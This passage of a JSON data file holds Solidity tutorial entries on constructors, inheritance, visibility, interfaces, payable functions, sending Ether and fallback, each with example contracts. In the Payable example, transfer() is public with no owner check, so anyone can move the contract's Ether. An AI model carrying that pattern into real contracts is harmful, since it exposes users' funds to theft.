        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.14;\n\n// Event-Driven Architecture\ncontract EventDrivenArchitecture {\n    event TransferInitiated(\n        address indexed from, address indexed to, uint256 value\n    );\n    event TransferConfirmed(\n        address indexed from, address indexed to, uint256 value\n    );\n\n    mapping(bytes32 => bool) public transferConfirmations;\n\n    function initiateTransfer(address to, uint256 value) public {\n        emit TransferInitiated(msg.sender, to, value);\n        // ... (initiate transfer logic)\n    }\n\n    function confirmTransfer(bytes32 transferId) public {\n        require(\n            !transferConfirmations[transferId], \"Transfer already confirmed\"\n        );\n        transferConfirmations[transferId] = true;\n        emit TransferConfirmed(msg.sender, address(this), 0);\n        // ... (confirm transfer logic)\n    }\n}\n\n// Event Subscription and Real-Time Updates\ninterface IEventSubscriber {\n    function handleTransferEvent(address from, address to, uint256 value)\n        external;\n}\n\ncontract EventSubscription {\n    event LogTransfer(address indexed from, address indexed to, uint256 value);\n\n    mapping(address => bool) public subscribers;\n    address[] public subscriberList;\n\n    function subscribe() public {\n        require(!subscribers[msg.sender], \"Already subscribed\");\n        subscribers[msg.sender] = true;\n        subscriberList.push(msg.sender);\n    }\n\n    function unsubscribe() public {\n        require(subscribers[msg.sender], \"Not subscribed\");\n        subscribers[msg.sender] = false;\n        for (uint256 i = 0; i < subscriberList.length; i++) {\n            if (subscriberList[i] == msg.sender) {\n                subscriberList[i] = subscriberList[subscriberList.length - 1];\n                subscriberList.pop();\n                break;\n            }\n        }\n    }\n\n    function transfer(address to, uint256 value) public {\n        emit LogTransfer(msg.sender, to, value);\n        for (uint256 i = 0; i < subscriberList.length; i++) {\n            IEventSubscriber(subscriberList[i]).handleTransferEvent(\n                msg.sender, to, value\n            );\n        }\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "events",
      "advanced",
      "event-driven",
      "monitoring",
      "filtering",
      "security"
    ],
    "order": 23
  },
  {
    "slug": "constructor",
    "title": "Constructor",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Learn how to initialize smart contracts in Solidity using a constructor",
    "content": "A `constructor` is an optional function that is executed upon contract creation.\n\nHere are examples of how to pass arguments to `constructors`.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// Base contract X\ncontract X {\n    string public name;\n\n    constructor(string memory _name) {\n        name = _name;\n    }\n}\n\n// Base contract Y\ncontract Y {\n    string public text;\n\n    constructor(string memory _text) {\n        text = _text;\n    }\n}\n\n// There are 2 ways to initialize parent contract with parameters.\n\n// Pass the parameters here in the inheritance list.\ncontract B is X(\"Input to X\"), Y(\"Input to Y\") {}\n\ncontract C is X, Y {\n    // Pass the parameters here in the constructor,\n    // similar to function modifiers.\n    constructor(string memory _name, string memory _text) X(_name) Y(_text) {}\n}\n\n// Parent constructors are always called in the order of inheritance\n// regardless of the order of parent contracts listed in the\n// constructor of the child contract.\n\n// Order of constructors called:\n// 1. X\n// 2. Y\n// 3. D\ncontract D is X, Y {\n    constructor() X(\"X was called\") Y(\"Y was called\") {}\n}\n\n// Order of constructors called:\n// 1. X\n// 2. Y\n// 3. E\ncontract E is X, Y {\n    constructor() Y(\"Y was called\") X(\"X was called\") {}\n}\n\n```",
    "codes": [
      {
        "fileName": "Constructor.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// Base contract X\ncontract X {\n    string public name;\n\n    constructor(string memory _name) {\n        name = _name;\n    }\n}\n\n// Base contract Y\ncontract Y {\n    string public text;\n\n    constructor(string memory _text) {\n        text = _text;\n    }\n}\n\n// There are 2 ways to initialize parent contract with parameters.\n\n// Pass the parameters here in the inheritance list.\ncontract B is X(\"Input to X\"), Y(\"Input to Y\") {}\n\ncontract C is X, Y {\n    // Pass the parameters here in the constructor,\n    // similar to function modifiers.\n    constructor(string memory _name, string memory _text) X(_name) Y(_text) {}\n}\n\n// Parent constructors are always called in the order of inheritance\n// regardless of the order of parent contracts listed in the\n// constructor of the child contract.\n\n// Order of constructors called:\n// 1. X\n// 2. Y\n// 3. D\ncontract D is X, Y {\n    constructor() X(\"X was called\") Y(\"Y was called\") {}\n}\n\n// Order of constructors called:\n// 1. X\n// 2. Y\n// 3. E\ncontract E is X, Y {\n    constructor() Y(\"Y was called\") X(\"X was called\") {}\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "constructor",
      "constructors",
      "contract",
      "inheritance"
    ],
    "order": 24
  },
  {
    "slug": "inheritance",
    "title": "Inheritance",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Example of inheritance in Solidity",
    "content": "Solidity supports multiple inheritance. Contracts can inherit other contract by using the `is` keyword.\n\nFunction that is going to be overridden by a child contract must be declared as `virtual`.\n\nFunction that is going to override a parent function must use the keyword `override`.\n\nOrder of inheritance is important.\n\nYou have to list the parent contracts in the order from \"most base-like\" to \"most derived\".\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/* Graph of inheritance\n    A\n   / \\\n  B   C\n / \\ /\nF  D,E\n\n*/\n\ncontract A {\n    function foo() public pure virtual returns (string memory) {\n        return \"A\";\n    }\n}\n\n// Contracts inherit other contracts by using the keyword 'is'.\ncontract B is A {\n    // Override A.foo()\n    function foo() public pure virtual override returns (string memory) {\n        return \"B\";\n    }\n}\n\ncontract C is A {\n    // Override A.foo()\n    function foo() public pure virtual override returns (string memory) {\n        return \"C\";\n    }\n}\n\n// Contracts can inherit from multiple parent contracts.\n// When a function is called that is defined multiple times in\n// different contracts, parent contracts are searched from\n// right to left, and in a depth-first manner.\n\ncontract D is B, C {\n    // D.foo() returns \"C\"\n    // since C is the right most parent contract with function foo()\n    function foo() public pure override(B, C) returns (string memory) {\n        return super.foo();\n    }\n}\n\ncontract E is C, B {\n    // E.foo() returns \"B\"\n    // since B is the right most parent contract with function foo()\n    function foo() public pure override(C, B) returns (string memory) {\n        return super.foo();\n    }\n}\n\n// Inheritance must be ordered from \"most base-like\" to \"most derived\".\n// Swapping the order of A and B will throw a compilation error.\ncontract F is A, B {\n    function foo() public pure override(A, B) returns (string memory) {\n        return super.foo();\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "Inheritance.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/* Graph of inheritance\n    A\n   / \\\n  B   C\n / \\ /\nF  D,E\n\n*/\n\ncontract A {\n    function foo() public pure virtual returns (string memory) {\n        return \"A\";\n    }\n}\n\n// Contracts inherit other contracts by using the keyword 'is'.\ncontract B is A {\n    // Override A.foo()\n    function foo() public pure virtual override returns (string memory) {\n        return \"B\";\n    }\n}\n\ncontract C is A {\n    // Override A.foo()\n    function foo() public pure virtual override returns (string memory) {\n        return \"C\";\n    }\n}\n\n// Contracts can inherit from multiple parent contracts.\n// When a function is called that is defined multiple times in\n// different contracts, parent contracts are searched from\n// right to left, and in a depth-first manner.\n\ncontract D is B, C {\n    // D.foo() returns \"C\"\n    // since C is the right most parent contract with function foo()\n    function foo() public pure override(B, C) returns (string memory) {\n        return super.foo();\n    }\n}\n\ncontract E is C, B {\n    // E.foo() returns \"B\"\n    // since B is the right most parent contract with function foo()\n    function foo() public pure override(C, B) returns (string memory) {\n        return super.foo();\n    }\n}\n\n// Inheritance must be ordered from \"most base-like\" to \"most derived\".\n// Swapping the order of A and B will throw a compilation error.\ncontract F is A, B {\n    function foo() public pure override(A, B) returns (string memory) {\n        return super.foo();\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "inheritance",
      "super",
      "override",
      "virtual",
      "is",
      "contract",
      "contracts"
    ],
    "order": 25
  },
  {
    "slug": "shadowing-inherited-state-variables",
    "title": "Shadowing Inherited State Variables",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "An example of shadowing state variables by inheritance",
    "content": "Unlike functions, state variables cannot be overridden by redeclaring it\nin the child contract.\n\nLet's learn how to correctly override inherited state variables.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract A {\n    string public name = \"Contract A\";\n\n    function getName() public view returns (string memory) {\n        return name;\n    }\n}\n\n// Shadowing is disallowed in Solidity 0.6\n// This will not compile\n// contract B is A {\n//     string public name = \"Contract B\";\n// }\n\ncontract C is A {\n    // This is the correct way to override inherited state variables.\n    constructor() {\n        name = \"Contract C\";\n    }\n\n    // C.getName returns \"Contract C\"\n}\n\n```",
    "codes": [
      {
        "fileName": "Shadow.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract A {\n    string public name = \"Contract A\";\n\n    function getName() public view returns (string memory) {\n        return name;\n    }\n}\n\n// Shadowing is disallowed in Solidity 0.6\n// This will not compile\n// contract B is A {\n//     string public name = \"Contract B\";\n// }\n\ncontract C is A {\n    // This is the correct way to override inherited state variables.\n    constructor() {\n        name = \"Contract C\";\n    }\n\n    // C.getName returns \"Contract C\"\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "state",
      "variables",
      "variable",
      "shadow",
      "shadowing",
      "inheritance"
    ],
    "order": 26
  },
  {
    "slug": "super",
    "title": "Calling Parent Contracts",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "An example of calling parent contracts in Solidity",
    "content": "Parent contracts can be called directly, or by using the keyword `super`.\n\nBy using the keyword `super`, all of the immediate parent contracts will be called.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/* Inheritance tree\n   A\n /  \\\nB   C\n \\ /\n  D\n*/\n\ncontract A {\n    // This is called an event. You can emit events from your function\n    // and they are logged into the transaction log.\n    // In our case, this will be useful for tracing function calls.\n    event Log(string message);\n\n    function foo() public virtual {\n        emit Log(\"A.foo called\");\n    }\n\n    function bar() public virtual {\n        emit Log(\"A.bar called\");\n    }\n}\n\ncontract B is A {\n    function foo() public virtual override {\n        emit Log(\"B.foo called\");\n        A.foo();\n    }\n\n    function bar() public virtual override {\n        emit Log(\"B.bar called\");\n        super.bar();\n    }\n}\n\ncontract C is A {\n    function foo() public virtual override {\n        emit Log(\"C.foo called\");\n        A.foo();\n    }\n\n    function bar() public virtual override {\n        emit Log(\"C.bar called\");\n        super.bar();\n    }\n}\n\ncontract D is B, C {\n    // Try:\n    // - Call D.foo and check the transaction logs.\n    //   Although D inherits A, B and C, it only called C and then A.\n    // - Call D.bar and check the transaction logs\n    //   D called C, then B, and finally A.\n    //   Although super was called twice (by B and C) it only called A once.\n\n    function foo() public override(B, C) {\n        super.foo();\n    }\n\n    function bar() public override(B, C) {\n        super.bar();\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "Super.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/* Inheritance tree\n   A\n /  \\\nB   C\n \\ /\n  D\n*/\n\ncontract A {\n    // This is called an event. You can emit events from your function\n    // and they are logged into the transaction log.\n    // In our case, this will be useful for tracing function calls.\n    event Log(string message);\n\n    function foo() public virtual {\n        emit Log(\"A.foo called\");\n    }\n\n    function bar() public virtual {\n        emit Log(\"A.bar called\");\n    }\n}\n\ncontract B is A {\n    function foo() public virtual override {\n        emit Log(\"B.foo called\");\n        A.foo();\n    }\n\n    function bar() public virtual override {\n        emit Log(\"B.bar called\");\n        super.bar();\n    }\n}\n\ncontract C is A {\n    function foo() public virtual override {\n        emit Log(\"C.foo called\");\n        A.foo();\n    }\n\n    function bar() public virtual override {\n        emit Log(\"C.bar called\");\n        super.bar();\n    }\n}\n\ncontract D is B, C {\n    // Try:\n    // - Call D.foo and check the transaction logs.\n    //   Although D inherits A, B and C, it only called C and then A.\n    // - Call D.bar and check the transaction logs\n    //   D called C, then B, and finally A.\n    //   Although super was called twice (by B and C) it only called A once.\n\n    function foo() public override(B, C) {\n        super.foo();\n    }\n\n    function bar() public override(B, C) {\n        super.bar();\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "calling",
      "parent",
      "contract",
      "contracts",
      "inheritance",
      "super"
    ],
    "order": 27
  },
  {
    "slug": "visibility",
    "title": "Visibility",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "An example of external, internal, private and public functions in Solidity",
    "content": "Functions and state variables have to declare whether they are accessible by other contracts.\n\nFunctions can be declared as\n\n- `public` - any contract and account can call\n- `private` - only inside the contract that defines the function\n- `internal`- only inside a contract that inherits an `internal` function\n- `external` - only other contracts and accounts can call\n\nState variables can be declared as `public`, `private`, or `internal` but not `external`.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Base {\n    // Private function can only be called\n    // - inside this contract\n    // Contracts that inherit this contract cannot call this function.\n    function privateFunc() private pure returns (string memory) {\n        return \"private function called\";\n    }\n\n    function testPrivateFunc() public pure returns (string memory) {\n        return privateFunc();\n    }\n\n    // Internal function can be called\n    // - inside this contract\n    // - inside contracts that inherit this contract\n    function internalFunc() internal pure returns (string memory) {\n        return \"internal function called\";\n    }\n\n    function testInternalFunc() public pure virtual returns (string memory) {\n        return internalFunc();\n    }\n\n    // Public functions can be called\n    // - inside this contract\n    // - inside contracts that inherit this contract\n    // - by other contracts and accounts\n    function publicFunc() public pure returns (string memory) {\n        return \"public function called\";\n    }\n\n    // External functions can only be called\n    // - by other contracts and accounts\n    function externalFunc() external pure returns (string memory) {\n        return \"external function called\";\n    }\n\n    // This function will not compile since we're trying to call\n    // an external function here.\n    // function testExternalFunc() public pure returns (string memory) {\n    //     return externalFunc();\n    // }\n\n    // State variables\n    string private privateVar = \"my private variable\";\n    string internal internalVar = \"my internal variable\";\n    string public publicVar = \"my public variable\";\n    // State variables cannot be external so this code won't compile.\n    // string external externalVar = \"my external variable\";\n}\n\ncontract Child is Base {\n    // Inherited contracts do not have access to private functions\n    // and state variables.\n    // function testPrivateFunc() public pure returns (string memory) {\n    //     return privateFunc();\n    // }\n\n    // Internal function can be called inside child contracts.\n    function testInternalFunc() public pure override returns (string memory) {\n        return internalFunc();\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "Visibility.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Base {\n    // Private function can only be called\n    // - inside this contract\n    // Contracts that inherit this contract cannot call this function.\n    function privateFunc() private pure returns (string memory) {\n        return \"private function called\";\n    }\n\n    function testPrivateFunc() public pure returns (string memory) {\n        return privateFunc();\n    }\n\n    // Internal function can be called\n    // - inside this contract\n    // - inside contracts that inherit this contract\n    function internalFunc() internal pure returns (string memory) {\n        return \"internal function called\";\n    }\n\n    function testInternalFunc() public pure virtual returns (string memory) {\n        return internalFunc();\n    }\n\n    // Public functions can be called\n    // - inside this contract\n    // - inside contracts that inherit this contract\n    // - by other contracts and accounts\n    function publicFunc() public pure returns (string memory) {\n        return \"public function called\";\n    }\n\n    // External functions can only be called\n    // - by other contracts and accounts\n    function externalFunc() external pure returns (string memory) {\n        return \"external function called\";\n    }\n\n    // This function will not compile since we're trying to call\n    // an external function here.\n    // function testExternalFunc() public pure returns (string memory) {\n    //     return externalFunc();\n    // }\n\n    // State variables\n    string private privateVar = \"my private variable\";\n    string internal internalVar = \"my internal variable\";\n    string public publicVar = \"my public variable\";\n    // State variables cannot be external so this code won't compile.\n    // string external externalVar = \"my external variable\";\n}\n\ncontract Child is Base {\n    // Inherited contracts do not have access to private functions\n    // and state variables.\n    // function testPrivateFunc() public pure returns (string memory) {\n    //     return privateFunc();\n    // }\n\n    // Internal function can be called inside child contracts.\n    function testInternalFunc() public pure override returns (string memory) {\n        return internalFunc();\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "visibility",
      "function",
      "functions",
      "internal",
      "private",
      "public",
      "external"
    ],
    "order": 28
  },
  {
    "slug": "interface",
    "title": "Interface",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "An example of interface in Solidity",
    "content": "You can interact with other contracts by declaring an `Interface`.\n\nInterface\n\n- cannot have any functions implemented\n- can inherit from other interfaces\n- all declared functions must be external\n- cannot declare a constructor\n- cannot declare state variables\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Counter {\n    uint256 public count;\n\n    function increment() external {\n        count += 1;\n    }\n}\n\ninterface ICounter {\n    function count() external view returns (uint256);\n\n    function increment() external;\n}\n\ncontract MyContract {\n    function incrementCounter(address _counter) external {\n        ICounter(_counter).increment();\n    }\n\n    function getCount(address _counter) external view returns (uint256) {\n        return ICounter(_counter).count();\n    }\n}\n\n// Uniswap example\ninterface UniswapV2Factory {\n    function getPair(address tokenA, address tokenB)\n        external\n        view\n        returns (address pair);\n}\n\ninterface UniswapV2Pair {\n    function getReserves()\n        external\n        view\n        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n}\n\ncontract UniswapExample {\n    address private factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;\n    address private dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\n    address private weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n\n    function getTokenReserves() external view returns (uint256, uint256) {\n        address pair = UniswapV2Factory(factory).getPair(dai, weth);\n        (uint256 reserve0, uint256 reserve1,) =\n            UniswapV2Pair(pair).getReserves();\n        return (reserve0, reserve1);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "Interface.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Counter {\n    uint256 public count;\n\n    function increment() external {\n        count += 1;\n    }\n}\n\ninterface ICounter {\n    function count() external view returns (uint256);\n\n    function increment() external;\n}\n\ncontract MyContract {\n    function incrementCounter(address _counter) external {\n        ICounter(_counter).increment();\n    }\n\n    function getCount(address _counter) external view returns (uint256) {\n        return ICounter(_counter).count();\n    }\n}\n\n// Uniswap example\ninterface UniswapV2Factory {\n    function getPair(address tokenA, address tokenB)\n        external\n        view\n        returns (address pair);\n}\n\ninterface UniswapV2Pair {\n    function getReserves()\n        external\n        view\n        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n}\n\ncontract UniswapExample {\n    address private factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;\n    address private dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\n    address private weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n\n    function getTokenReserves() external view returns (uint256, uint256) {\n        address pair = UniswapV2Factory(factory).getPair(dai, weth);\n        (uint256 reserve0, uint256 reserve1,) =\n            UniswapV2Pair(pair).getReserves();\n        return (reserve0, reserve1);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "interface",
      "interfaces",
      "contract",
      "contracts"
    ],
    "order": 29
  },
  {
    "slug": "payable",
    "title": "Payable",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "An example of how to use the keyword payable in Solidity",
    "content": "Functions and addresses declared `payable` can receive `ether` into the contract.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Payable {\n    // Payable address can send Ether via transfer or send\n    address payable public owner;\n\n    // Payable constructor can receive Ether\n    constructor() payable {\n        owner = payable(msg.sender);\n    }\n\n    // Function to deposit Ether into this contract.\n    // Call this function along with some Ether.\n    // The balance of this contract will be automatically updated.\n    function deposit() public payable {}\n\n    // Call this function along with some Ether.\n    // The function will throw an error since this function is not payable.\n    function notPayable() public {}\n\n    // Function to withdraw all Ether from this contract.\n    function withdraw() public {\n        // get the amount of Ether stored in this contract\n        uint256 amount = address(this).balance;\n\n        // send all Ether to owner\n        (bool success,) = owner.call{value: amount}(\"\");\n        require(success, \"Failed to send Ether\");\n    }\n\n    // Function to transfer Ether from this contract to address from input\n    function transfer(address payable _to, uint256 _amount) public {\n        // Note that \"to\" is declared as payable\n        (bool success,) = _to.call{value: _amount}(\"\");\n        require(success, \"Failed to send Ether\");\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "Payable.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Payable {\n    // Payable address can send Ether via transfer or send\n    address payable public owner;\n\n    // Payable constructor can receive Ether\n    constructor() payable {\n        owner = payable(msg.sender);\n    }\n\n    // Function to deposit Ether into this contract.\n    // Call this function along with some Ether.\n    // The balance of this contract will be automatically updated.\n    function deposit() public payable {}\n\n    // Call this function along with some Ether.\n    // The function will throw an error since this function is not payable.\n    function notPayable() public {}\n\n    // Function to withdraw all Ether from this contract.\n    function withdraw() public {\n        // get the amount of Ether stored in this contract\n        uint256 amount = address(this).balance;\n\n        // send all Ether to owner\n        (bool success,) = owner.call{value: amount}(\"\");\n        require(success, \"Failed to send Ether\");\n    }\n\n    // Function to transfer Ether from this contract to address from input\n    function transfer(address payable _to, uint256 _amount) public {\n        // Note that \"to\" is declared as payable\n        (bool success,) = _to.call{value: _amount}(\"\");\n        require(success, \"Failed to send Ether\");\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "payable",
      "eth",
      "send",
      "ether"
    ],
    "order": 30
  },
  {
    "slug": "sending-ether",
    "title": "Sending Ether (transfer, send, call)",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "An example of sending Ether in Solidity",
    "content": "### How to send Ether?\n\nYou can send Ether to other contracts by\n\n- `transfer` (2300 gas, throws error)\n- `send` (2300 gas, returns bool)\n- `call` (forward all gas or set gas, returns bool)\n\n### How to receive Ether?\n\nA contract receiving Ether must have at least one of the functions below\n\n- `receive() external payable`\n- `fallback() external payable`\n\n`receive()` is called if `msg.data` is empty, otherwise `fallback()` is called.\n\n### Which method should you use?\n\n`call` in combination with re-entrancy guard is the recommended method to use after December 2019.\n\nGuard against re-entrancy by\n\n- making all state changes before calling other contracts\n- using re-entrancy guard modifier\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract ReceiveEther {\n    /*\n    Which function is called, fallback() or receive()?\n\n           send Ether\n               |\n         msg.data is empty?\n              / \\\n            yes  no\n            /     \\\n    receive() exists?  fallback()\n         /   \\\n        yes   no\n        /      \\\n    receive()   fallback()\n    */\n\n    // Function to receive Ether. msg.data must be empty\n    receive() external payable {}\n\n    // Fallback function is called when msg.data is not empty\n    fallback() external payable {}\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\ncontract SendEther {\n    function sendViaTransfer(address payable _to) public payable {\n        // This function is no longer recommended for sending Ether.\n        _to.transfer(msg.value);\n    }\n\n    function sendViaSend(address payable _to) public payable {\n        // Send returns a boolean value indicating success or failure.\n        // This function is not recommended for sending Ether.\n        bool sent = _to.send(msg.value);\n        require(sent, \"Failed to send Ether\");\n    }\n\n    function sendViaCall(address payable _to) public payable {\n        // Call returns a boolean value indicating success or failure.\n        // This is the current recommended method to use.\n        (bool sent, bytes memory data) = _to.call{value: msg.value}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "SendingEther.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract ReceiveEther {\n    /*\n    Which function is called, fallback() or receive()?\n\n           send Ether\n               |\n         msg.data is empty?\n              / \\\n            yes  no\n            /     \\\n    receive() exists?  fallback()\n         /   \\\n        yes   no\n        /      \\\n    receive()   fallback()\n    */\n\n    // Function to receive Ether. msg.data must be empty\n    receive() external payable {}\n\n    // Fallback function is called when msg.data is not empty\n    fallback() external payable {}\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\ncontract SendEther {\n    function sendViaTransfer(address payable _to) public payable {\n        // This function is no longer recommended for sending Ether.\n        _to.transfer(msg.value);\n    }\n\n    function sendViaSend(address payable _to) public payable {\n        // Send returns a boolean value indicating success or failure.\n        // This function is not recommended for sending Ether.\n        bool sent = _to.send(msg.value);\n        require(sent, \"Failed to send Ether\");\n    }\n\n    function sendViaCall(address payable _to) public payable {\n        // Call returns a boolean value indicating success or failure.\n        // This is the current recommended method to use.\n        (bool sent, bytes memory data) = _to.call{value: msg.value}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "sending",
      "send",
      "ether",
      "eth",
      "transfer",
      "send",
      "call",
      "fallback",
      "receive",
      "payable",
      "function",
      "functions"
    ],
    "order": 31
  },
  {
    "slug": "fallback",
    "title": "Fallback",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Example of how to use fallback in Solidity",
    "content": "`fallback` is a special function that is executed either when\n\n- a function that does not exist is called or\n- Ether is sent directly to a contract but `receive()` does not exist or `msg.data` is not empty\n\nTo better understand the conditions under which Solidity calls the `receive` or `fallback` function, refer to the flowchart below:\n\n```\n                 send Ether\n                      |\n           msg.data is empty?\n                /           \\\n            yes             no\n             |                |\n    receive() exists?     fallback()\n        /        \\\n     yes          no\n      |            |\n  receive()     fallback()\n```\n\n`fallback` has a 2300 gas limit when called by `transfer` or `send`.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Fallback {\n    event Log(string func, uint256 gas);\n\n    // Fallback function must be declared as external.\n    fallback() external payable {\n        // send / transfer (forwards 2300 gas to this fallback function)\n        // call (forwards all of the gas)\n        emit Log(\"fallback\", gasleft());\n    }\n\n    // Receive is a variant of fallback that is triggered when msg.data is empty\n    receive() external payable {\n        emit Log(\"receive\", gasleft());\n    }\n\n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\ncontract SendToFallback {\n    function transferToFallback(address payable _to) public payable {\n        _to.transfer(msg.value);\n    }\n\n    function callFallback(address payable _to) public payable {\n        (bool sent,) = _to.call{value: msg.value}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\n```\n\n`fallback` can optionally take `bytes` for input and output\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// TestFallbackInputOutput -> FallbackInputOutput -> Counter\ncontract FallbackInputOutput {\n    address immutable target;\n\n    constructor(address _target) {\n        target = _target;\n    }\n\n    fallback(bytes calldata data) external payable returns (bytes memory) {\n        (bool ok, bytes memory res) = target.call{value: msg.value}(data);\n        require(ok, \"call failed\");\n        return res;\n    }\n}\n\ncontract Counter {\n    uint256 public count;\n\n    function get() external view returns (uint256) {\n        return count;\n    }\n\n    function inc() external returns (uint256) {\n        count += 1;\n        return count;\n    }\n}\n\ncontract TestFallbackInputOutput {\n    event Log(bytes res);\n\n    function test(address _fallback, bytes calldata data) external {\n        (bool ok, bytes memory res) = _fallback.call(data);\n        require(ok, \"call failed\");\n        emit Log(res);\n    }\n\n    function getTestData() external pure returns (bytes memory, bytes memory) {\n        return\n            (abi.encodeCall(Counter.get, ()), abi.encodeCall(Counter.inc, ()));\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "Fallback.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Fallback {\n    event Log(string func, uint256 gas);\n\n    // Fallback function must be declared as external.\n    fallback() external payable {\n        // send / transfer (forwards 2300 gas to this fallback function)\n        // call (forwards all of the gas)\n        emit Log(\"fallback\", gasleft());\n    }\n\n    // Receive is a variant of fallback that is triggered when msg.data is empty\n    receive() external payable {\n        emit Log(\"receive\", gasleft());\n    }\n\n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\ncontract SendToFallback {\n    function transferToFallback(address payable _to) public payable {\n        _to.transfer(msg.value);\n    }\n\n    function callFallback(address payable _to) public payable {\n        (bool sent,) = _to.call{value: msg.value}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n"
      },
      {
        "fileName": "FallbackInputOutput.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// TestFallbackInputOutput -> FallbackInputOutput -> Counter\ncontract FallbackInputOutput {\n    address immutable target;\n\n    constructor(address _target) {\n        target = _target;\n    }\n\n    fallback(bytes calldata data) external payable returns (bytes memory) {\n        (bool ok, bytes memory res) = target.call{value: msg.value}(data);\n        require(ok, \"call failed\");\n        return res;\n    }\n}\n\ncontract Counter {\n    uint256 public count;\n\n    function get() external view returns (uint256) {\n        return count;\n    }\n\n    function inc() external returns (uint256) {\n        count += 1;\n        return count;\n    }\n}\n\ncontract TestFallbackInputOutput {\n    event Log(bytes res);\n\n    function test(address _fallback, bytes calldata data) external {\n        (bool ok, bytes memory res) = _fallback.call(data);\n        require(ok, \"call failed\");\n        emit Log(res);\n    }\n\n    function getTestData() external pure returns (bytes memory, bytes memory) {\n        return\n            (abi.encodeCall(Counter.get, ()), abi.encodeCall(Counter.inc, ()));\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "fallback",
      "function",
      "functions",
      "receive",
      "payable",
      "send",
      "ether",
      "eth",
      "transfer"
    ],
    "order": 32
  },
  {
    "slug": "call",
    "title": "Call",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "In Solidity call is a low level function to interact with other contracts",
